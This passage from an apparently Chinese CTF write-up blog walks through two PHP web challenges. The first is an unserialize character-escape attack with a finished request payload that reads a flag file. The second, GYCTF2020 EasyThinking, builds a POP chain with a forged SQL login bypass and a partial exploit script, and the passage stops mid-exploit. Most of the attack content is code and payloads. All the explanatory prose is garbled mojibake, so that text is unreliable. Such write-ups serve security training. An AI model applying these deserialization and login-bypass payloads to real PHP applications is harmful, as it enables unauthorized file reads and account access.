class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode($_GET[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($function == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¾ˆå®¹æ˜“çœ‹åˆ°æœ‰ä¸€ä¸ªå˜é‡è¦†ç›–çš„æ¼æ´ï¼Œä½†æ˜¯è¿˜ä¸çŸ¥é“æ€ä¹ˆåˆ©ç”¨ï¼Œæ¥ç€å¾€ä¸‹çœ‹ã€‚</p>
<p>ä¼ å…¥<code>f=phpinfo</code>å¯ä»¥çœ‹åˆ°sometingï¼Œè¯•è¯•çœ‹</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200713152851.png" alt=""></p>
<p>åœ¨æ¯ä¸ªphpæ–‡ä»¶å‰é¢éƒ½è‡ªåŠ¨åŒ…å«äº†<code>d0g3_f1ag.php</code>ï¼Œç›´æ¥è®¿é—®æ²¡æœ‰ä»»ä½•å›æ˜¾ã€‚</p>
<p>å½“<code>$function=show_image</code>çš„æ—¶å€™ï¼Œä¼šè°ƒç”¨<code>file_get_contents</code>å‡½æ•°è¯»å–æ–‡ä»¶å†…å®¹ï¼Œå¦‚æœæˆ‘ä»¬èƒ½æ§åˆ¶<code>$userinfo['img']</code>å‚æ•°ä¸º<code>d0g3_f1ga.php</code>å°±å¯ä»¥è¯»flagã€‚</p>
<p>ä½†æ˜¯å¦‚æœä¼ å…¥<code>img_path</code>å‚æ•°çš„è¯ä¼šå…ˆå¯¹å…¶base64ç¼–ç ç„¶åsha1åŠ å¯†ï¼Œæ˜¯ä¸€ä¸ªä¸å¯é€†çš„æ“ä½œã€‚</p>
<p>é‚£ä¹ˆå†å»çœ‹å¦å¤–ä¸¤ä¸ªå‚æ•°<code>function</code>å’Œ<code>user</code>ï¼Œå…¶ä¸­<code>user</code>ä¹Ÿæ˜¯ç¡¬ç¼–ç æ— æ³•åˆ©ç”¨ï¼Œåªèƒ½ä»<code>function</code>å‚æ•°å…¥æ‰‹ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬è¿˜è¦æ³¨æ„åˆ°æœ‰ä¸€ä¸ª<code>filter</code>å‡½æ•°ç”¨äºè¿‡æ»¤<code>php</code>ã€<code>flag</code>ã€<code>php5</code>ã€<code>php4</code>å’Œ<code>fl1g</code>å…³é”®å­—ã€‚</p>
<blockquote>
<p>ä»»ä½•å…·æœ‰ä¸€å®šç»“æ„çš„æ•°æ®ï¼Œ<strong>å¦‚æœç»è¿‡äº†æŸäº›å¤„ç†è€ŒæŠŠç»“æ„ä½“æœ¬èº«çš„ç»“æ„ç»™æ‰“ä¹±äº†</strong>ï¼Œåˆ™æœ‰å¯èƒ½ä¼šäº§ç”Ÿæ¼æ´ã€‚</p>
</blockquote>
<p>é‚£ä¹ˆè¿™ä¸ªåœ°æ–¹å°±å¯ä»¥å¾ˆæ˜æ˜¾çš„ç”¨åˆ°ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸çš„æ¼æ´ï¼Œç”¨äºè¦†ç›–<code>$userinfo['img']</code>å‚æ•°ä¸º<code>d0g3_f1ag.php</code>ã€‚é¦–å…ˆçœ‹ä¸€ä¸‹ä¸€ä¸ªæ­£å¸¸çš„åºåˆ—åŒ–åçš„<code>$_SESSION</code>æ˜¯ä»€ä¹ˆæ ·å­çš„ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php &gt; $_SESSION[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">php &gt; $_SESSION[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;phpinfo&#x27;</span>;</span><br><span class="line">php &gt; $_SESSION[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">php &gt; print_r(serialize($_SESSION));</span><br><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;guest&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;phpinfo&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬è¦è¦†ç›–æ‰åºåˆ—åŒ–åçš„<code>img</code>å‚æ•°ï¼Œä¹Ÿå°±æ˜¯è¦æ’å…¥<code>s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</code>ï¼Œå³</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;guest&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;phpinfo&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>Z3Vlc3RfaW1nLnBuZw==<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨å˜é‡è¦†ç›–æ¼æ´æ¥è¦†ç›–<code>$_SESSION[&quot;user&quot;]</code>å’Œ<code>$_SESSION[&quot;function&quot;]</code>çš„å€¼ã€‚</p>
<p>å‡å¦‚æˆ‘ä»¬èµ‹å€¼<code>$_SESSION[&quot;user&quot;]=flagflagflagflagflagflag</code>ï¼Œ<code>$_SESSION[&quot;function&quot;]=a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;</code>ï¼Œé‚£ä¹ˆåºåˆ—åŒ–å<code>$serialize_info</code>ä¸ºï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">24</span>:<span class="string">&quot;flagflagflagflagflagflag&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">59</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;dd&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:28:&quot;</span>L3VwbG9hZC9ndWVzdF9pbWcuanBn<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
<p>è¿‡æ»¤ä¹‹åï¼Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">24</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">59</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;dd&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:28:&quot;</span>L3VwbG9hZC9ndWVzdF9pbWcuanBn<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­<code>&quot;;s:8:&quot;function&quot;;s:59:&quot;a</code>åˆšå¥½æ˜¯24ä¸ªå­—ç¬¦ï¼Œè¿™æ ·å°±å¯ä»¥æ§åˆ¶åé¢çš„åºåˆ—åŒ–å†…å®¹ã€‚</p>
<p>æ‰€ä»¥æœ€ç»ˆçš„payloadä¸ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_SESSION[user]&#x3D;flagflagflagflagflagflag&amp;_SESSION[function]&#x3D;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&amp;function&#x3D;show_image</span><br></pre></td></tr></table></figure>
<h3 id="å‚è€ƒ-v3">å‚è€ƒ</h3>
<p><a href="https://xz.aliyun.com/t/6911#toc-3">å®˜æ–¹writeup</a></p>
<p><a href="https://www.andseclab.com/2020/01/28/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/">ADæ”»é˜²å®éªŒå®¤â€”â€”PHPååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸</a></p>
<h2 id="GYCTF2020-EasyThinking">[GYCTF2020]EasyThinking</h2>
<h3 id="è€ƒç‚¹-v11">è€ƒç‚¹</h3>
<ul>
<li>POPé“¾æ„é€ </li>
<li>PHPååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸</li>
</ul>
<h3 id="è§£é¢˜-v11">è§£é¢˜</h3>
<p>ä¸‹è½½<code>www.zip</code>å®¡è®¡æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;lib.php&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;meta charset=&quot;utf-8&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;title&gt;update&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;h2&gt;è¿™æ˜¯ä¸€ä¸ªæœªå®Œæˆçš„é¡µé¢ï¼Œä¸Šçº¿æ—¶å»ºè®®åˆ é™¤æœ¬é¡µé¢&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> ($_SESSION[<span class="string">&#x27;login&#x27;</span>]!=<span class="number">1</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;ä½ è¿˜æ²¡æœ‰ç™»é™†å‘¢ï¼&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$users=<span class="keyword">new</span> User();</span><br><span class="line">$users-&gt;update();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;login&#x27;</span>]===<span class="number">1</span>)&#123;</span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">	<span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>update.php</code>é¡µé¢æç¤ºéœ€è¦ç™»å½•æ‰èƒ½è·å¾—flagã€‚</p>
<p>ä¸»è¦ä»£ç éƒ½åœ¨<code>lib.php</code>ä¸­ï¼Œå…ˆæ¥çœ‹ä¸€ä¸‹Userç±»</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $age=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> $nickname=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;username&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">        $mysqli=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;id=$mysqli-&gt;login(<span class="string">&#x27;select id,password from user where username=?&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;id)&#123;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;id&#x27;</span>]=<span class="keyword">$this</span>-&gt;id;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;login&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ä½ çš„IDæ˜¯&quot;</span>.$_SESSION[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ä½ å¥½ï¼&quot;</span>.$_SESSION[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;window.location.href=&#x27;./update.php&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;id;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $Info=unserialize(<span class="keyword">$this</span>-&gt;getNewinfo());</span><br><span class="line">        $age=$Info-&gt;age;</span><br><span class="line">        $nickname=$Info-&gt;nickname;</span><br><span class="line">        $updateAction=<span class="keyword">new</span> UpdateHelper($_SESSION[<span class="string">&#x27;id&#x27;</span>],$Info,<span class="string">&quot;update user SET age=<span class="subst">$age</span>,nickname=<span class="subst">$nickname</span> where id=&quot;</span>.$_SESSION[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">        <span class="comment">//è¿™ä¸ªåŠŸèƒ½è¿˜æ²¡æœ‰å†™å®Œ å…ˆå å‘</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $age=$_POST[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line">        $nickname=$_POST[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">        <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info($age,$nickname)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;nickname);<span class="comment">//å±</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname-&gt;update(<span class="keyword">$this</span>-&gt;age);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;0-0&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>login</code>å‡½æ•°ä¸­è°ƒç”¨<code>dbCtrl</code>ç±»ä¸­çš„<code>login</code>å‡½æ•°æ‰§è¡ŒSQLè¯­å¥ï¼Œ<code>update</code>å‡½æ•°ä¸­æœ‰ä¸€ä¸ªååºåˆ—åŒ–çš„åœ°æ–¹ï¼Œå‚æ•°æ˜¯<code>getNewInfo</code>å‡½æ•°çš„è¿”å›å€¼ã€‚</p>
<p><code>getNewInfo</code>å‡½æ•°ä¸­<code>age</code>å’Œ<code>nickname</code>å‚æ•°æ˜¯å¯æ§çš„ï¼Œä¼ ç»™äº†<code>Info</code>ç±»</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Info&#123;</span><br><span class="line">    public $age;</span><br><span class="line">    public $nickname;</span><br><span class="line">    public $CtrlCase;</span><br><span class="line">    public function __construct($age,$nickname)&#123;</span><br><span class="line">        $this-&gt;age&#x3D;$age;</span><br><span class="line">        $this-&gt;nickname&#x3D;$nickname;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __call($name,$argument)&#123;</span><br><span class="line">        echo $this-&gt;CtrlCase-&gt;login($argument[0]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç„¶åè¿˜è¦ç»è¿‡ä¸€æ¬¡<code>safe</code>å‡½æ•°</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params">$parm</span>)</span>&#123;</span><br><span class="line">    $array= <span class="keyword">array</span>(<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;regexp&#x27;</span>,<span class="string">&#x27;load&#x27;</span>,<span class="string">&#x27;into&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;insert&#x27;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;alter&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> str_replace($array,<span class="string">&#x27;hacker&#x27;</span>,$parm);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ›¿æ¢ä¹‹åæ”¹å˜äº†æ•°æ®çš„ç»“æ„ï¼Œç±»ä¼¼0CTF2016 piapiapiaè¿™é“é¢˜ï¼Œå¾ˆå¯èƒ½ä¼šå¼•å‘å­—ç¬¦é€ƒé€¸çš„æ¼æ´ã€‚</p>
<p>æ¥ç€çœ‹<code>dbCtrl</code>ç±»</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hostname=<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbuser=<span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbpass=<span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $database=<span class="string">&quot;test&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $mysqli;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=$_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token=$_SESSION[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params">$sql</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mysqli=<span class="keyword">new</span> mysqli(<span class="keyword">$this</span>-&gt;hostname, <span class="keyword">$this</span>-&gt;dbuser, <span class="keyword">$this</span>-&gt;dbpass, <span class="keyword">$this</span>-&gt;database);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;è¿æ¥å¤±è´¥ï¼Œé”™è¯¯:&quot;</span> . <span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        $result=<span class="keyword">$this</span>-&gt;mysqli-&gt;prepare($sql);</span><br><span class="line">        $result-&gt;bind_param(<span class="string">&#x27;s&#x27;</span>, <span class="keyword">$this</span>-&gt;name);</span><br><span class="line">        $result-&gt;execute();</span><br><span class="line">        $result-&gt;bind_result($idResult, $passwordResult);</span><br><span class="line">        $result-&gt;fetch();</span><br><span class="line">        $result-&gt;close();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $idResult;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$idResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;ç”¨æˆ·ä¸å­˜åœ¨!&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (md5(<span class="keyword">$this</span>-&gt;password)!==$passwordResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;å¯†ç é”™è¯¯ï¼&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;token&#x27;</span>]=<span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> $idResult;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params">$sql</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//è¿˜æ²¡æ¥å¾—åŠå†™</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬å¯ä»¥çŸ¥é“çš„ä¿¡æ¯:</p>
<ol>
<li>ç”¨æˆ·åå­˜åœ¨ï¼Œä¸”$this-&gt;passwordçš„md5çš„å€¼ä¸æ•°æ®åº“æŸ¥è¯¢ç”¨æˆ·å¯†ç ç›¸åŒã€‚</li>
<li>æˆ–è€…tokençš„å€¼ä¸ºadmin</li>
</ol>
<p>è¿™é‡Œæœ‰ç‚¹åƒ2019GXYCTFä¸­çš„babySqliï¼Œæ˜¯ä¸æ˜¯æˆ‘ä»¬æ§åˆ¶äº†sqlè¯­å¥ï¼Œä½¿ç”¨</p>
<ul>
<li><code>select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?</code></li>
<li>$this-&gt;password=1(1çš„md5çš„å€¼ä¸ºc4ca4238a0b923820dcc509a6f75849b)</li>
</ul>
<p>å°±å¯ä»¥é€šè¿‡ç™»å½•å¯†ç çš„éªŒè¯ã€‚</p>
<p>æ¥ä¸‹æ¥æ„é€ POPé“¾ï¼Œå…ˆæ¥æ‰¾ä¸€ä¸‹<code>__destruct</code>é­”æ³•æ–¹æ³•ï¼Œåœ¨<code>UpdateHelper</code>ç±»ä¸­</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">UpdateHelper</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $newinfo;</span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$newInfo,$sql</span>)</span>&#123;</span><br><span class="line">        $newInfo=unserialize($newInfo);</span><br><span class="line">        $upDate=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å‘ç°ä¼šæŠŠsqlç»™echoå‡ºæ¥ï¼Œå¦‚æœ<code>$sql=new User()</code>çš„è¯ï¼Œå°±ä¼šè§¦å‘Userå†…çš„__toString()é­”æœ¯æ–¹æ³•ï¼Œè¯¥é­”æœ¯æ–¹æ³•å†…è°ƒç”¨äº†<code>$nickname</code>å±æ€§çš„update()æ–¹æ³•ã€‚è™½ç„¶dbCtrlå¯¹è±¡æ‹¥æœ‰update()æ–¹æ³•ï¼Œä½†æ˜¯<code>$nickname</code>å®ä¾‹åŒ–æˆå¯¹è±¡æ²¡æ„ä¹‰ã€‚æ¥ç€çœ‹<code>Info</code>ç±»</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> $nickname;</span><br><span class="line">    <span class="keyword">public</span> $CtrlCase;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$age,$nickname</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname=$nickname;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$name,$argument</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;CtrlCase-&gt;login($argument[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™æ—¶æˆ‘ä»¬çœ‹åˆ°äº†Infoç±»å†…æœ‰<code>__call()</code>é­”æœ¯æ–¹æ³•ï¼Œå¦‚æœè°ƒç”¨äº†ä¸€ä¸ªä¸å­˜åœ¨çš„å±æ€§ï¼Œ<code>__call()</code>æ–¹æ³•å°±ä¼šè§¦å‘ï¼Œæ­£å¥½Infoç±»æ²¡æœ‰update()æ–¹æ³•ï¼Œé‚£ä¹ˆå¦‚æœUserå†…çš„<code>$nickname</code>å®ä¾‹åŒ–ä¸ºInfoå¯¹è±¡ï¼Œè°ƒç”¨ä¸å­˜åœ¨update()å°±ä¼šè§¦å‘è¿™ä¸ª<code>__call()</code>ï¼Œè¿™ä¸ª<code>__call()</code>é­”æœ¯æ–¹æ³•å°†Ctrlcaseçš„login()å‡½æ•°ç»“æœè¾“å‡ºå‡ºæ¥ã€‚</p>
<p>è¿™æ ·æˆ‘ä»¬åªéœ€è¦<code>$CtrlCase</code>å˜é‡å®ä¾‹åŒ–ä¸ºdbCtrlç±»çš„å¯¹è±¡ï¼Œè¿™å¥è¯ç›¸å½“äºç›¸å½“äº<code>dbCtrl::login($sql)</code>ï¼Œè€Œä¸”å¯çŸ¥<code>dbCtrl::login($sql)</code>ä¸­çš„<code>$sql</code>å‚æ•°ï¼Œå®é™…ä¸Šæ˜¯Userç±»ä¸­çš„$ageå˜é‡ä¼ å…¥çš„ï¼Œå‚æ•°å°±æ˜¯æˆ‘ä»¬æ§åˆ¶çš„äº†ã€‚</p>
<p>expï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> $age = <span class="literal">null</span>;</span><br><span class="line">   <span class="keyword">public</span> $nickname = <span class="literal">null</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;age = <span class="string">&#x27;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&#x27;</span>;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;nickname = <span class="keyword">new</span> Info();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> 